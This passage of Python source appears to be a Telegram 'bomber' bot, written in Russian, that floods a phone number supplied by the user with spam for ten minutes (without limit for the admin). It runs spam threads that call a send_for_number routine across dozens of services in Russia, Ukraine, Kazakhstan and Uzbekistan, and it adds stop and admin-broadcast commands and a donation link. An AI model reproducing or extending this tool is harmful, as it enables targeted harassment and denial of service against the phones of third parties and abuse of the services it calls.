	msg = f'‍Номер телефона: {phone_number}\nТаймер: 10 минут\nСпам успешно начался!'

	bot.send_message(chat_id, msg)
	end = datetime.now() + timedelta(minutes = 10)
	while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
		if chat_id not in running_spams_per_chat_id:
			break
		send_for_number(phone_number)
	bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
	THREADS_AMOUNT[0] -= 1 # стояло 1
	try:
		running_spams_per_chat_id.remove(chat_id)
	except Exception:
		pass


def spam_handler(phone, chat_id, force):
	if int(chat_id) in running_spams_per_chat_id:
		bot.send_message(chat_id, 'Вы уже запустили спам, подождите немного или нажми на кнопку стоп и попробуйте еще раз')
		return

	if THREADS_AMOUNT[0] < THREADS_LIMIT:
		x = Thread(target=start_spam, args=(chat_id, phone, force))
		threads.append(x)
		THREADS_AMOUNT[0] += 10
		x.start()
	else:
		bot.send_message(chat_id, 'Пиздец...Кажется терминал закрылся...')
		print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
	chat_id = int(message.chat.id)
	text = message.text

	if text == '️Информация':
		bot.send_message(chat_id, 'Создал бота: @shbodyakin\nB0dyak1n_bomber\n\n<b>💗Подпишитесь на наш канал💗\n\n Наш канал: @b0dyak1n </b>', parse_mode='HTML')

	elif text == 'Спам':
		bot.send_message(chat_id, 'Введи номер без + в формате:\n  🇺🇦: 380xxxxxxxxx\n 🇷🇺: 79xxxxxxxxx\n  🇰🇿: 77xxxxxxxxx\n 🇺🇿: 998хххххххх\n')

	elif text == 'Статистика':
		bot.send_message(chat_id, f'Статистика юзеров отображается в реальном времени!\nПользователей: {users_amount[0]}\nСервисов для 🇷🇺: 60\nСервисов для 🇺🇦: 35\nСервисов для 🇰🇿 и 🇺🇿: 20\n<b>Бот запущен: 13.06.2020</b>', parse_mode='HTML')
	
	elif text == 'Задонатить создателю':
		bot.send_message(chat_id, 'Вы можете поддержать разработчика задонатив ему🤑\nQiwi: http://qiwi.com/n/BODYAKIN\nСпасибо тебе💗')   

	elif text == 'Рассылка' and chat_id==ADMIN_CHAT_ID:
		bot.send_message(chat_id, '')


	elif text == 'Остановить спам':
		if chat_id not in running_spams_per_chat_id:
			bot.send_message(chat_id, 'Вы еще не начинали спам')
		else:
			running_spams_per_chat_id.remove(chat_id)

	elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
		msg = text.replace("РАЗОСЛАТЬ: ", "")
		send_message_users(msg)

	elif len(text) == 11:
			phone = text
			spam_handler(phone, chat_id, force=False)


	elif len(text) == 12:
		phone = text
		spam_handler(phone, chat_id, force=False)



	elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
		phone = text[1:]
		spam_handler(phone, chat_id, force=True)

	else:
		bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
		print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')      

if __name__ == '__main__':
	bot.polling(none_stop=True)
 
